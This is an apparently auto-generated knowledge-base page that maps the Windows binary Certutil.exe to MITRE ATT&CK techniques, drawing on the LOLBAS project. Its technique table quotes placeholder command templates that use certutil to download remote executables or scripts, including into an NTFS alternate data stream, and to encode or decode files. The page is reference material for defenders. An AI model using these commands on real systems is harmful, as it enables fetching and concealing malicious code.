---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Certutil.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `certutil.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certutil.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Windows binary used for handling certificates

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/certutil.md)
- Source verification: [source record](../../sources/lolbas/certutil.exe.md)

## Aliases

- `Certutil.exe`
- `certutil.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1027.013 - Encrypted／Encoded File](../../attack/techniques/T1027.013-encrypted-encoded-file.md) | explicit | source | Command metadata lists T1027.013: certutil -encode {PATH} {PATH:.base64} |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: certutil.exe -URL {REMOTEURL:.exe} |
| [T1140 - Deobfuscate／Decode Files or Information](../../attack/techniques/T1140-deobfuscate-decode-files-or-information.md) | explicit | source | Command metadata lists T1140: certutil -decodehex {PATH:.hex} {PATH} |
| [T1564.004 - NTFS File Attributes](../../attack/techniques/T1564.004-ntfs-file-attributes.md) | explicit | source | Command metadata lists T1564.004: certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/certutil.exe.md)

## Source Verification

[source record](../../sources/lolbas/certutil.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@mattifestation'
Person: Matt Graeber
- Handle: '@Moriarty_Meng'
Person: Moriarty
- Handle: '@egre55'
Person: egre55
- Person: Lior Adar
```
